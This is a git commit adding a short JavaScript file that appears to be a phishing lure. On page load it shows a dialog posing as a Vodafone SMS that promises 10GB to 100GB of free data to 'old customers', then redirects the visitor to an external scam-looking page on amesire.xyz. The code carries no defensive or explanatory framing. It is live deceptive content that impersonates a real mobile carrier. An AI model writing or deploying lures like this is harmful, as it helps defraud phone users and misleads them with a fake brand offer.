90731d976976c40a13da1ad05648ea8c9105c506
esiditid <amesire247@gmail.com>
2025-09-11 13:46:48 -0700

    Create activation-freevodafonedata.au.js

---
+++ activation-freevodafonedata.au.js
@@ -0,0 +1,6 @@
+
+var password = 'GET FREE DATA'
+password=prompt('VODAFONE SMS: Dear Customer, Kindly Check If your Vodafone Sim Card Is Qualify To Receive From 10GB To 100GB data, Old Customers Reward, press Get Free Data To Check Now ','GET FREE DATA');
+if (password != 'GET FREE DATA') {
+location.href='https://amesire.xyz/freevodafonedata.au.html';
+}
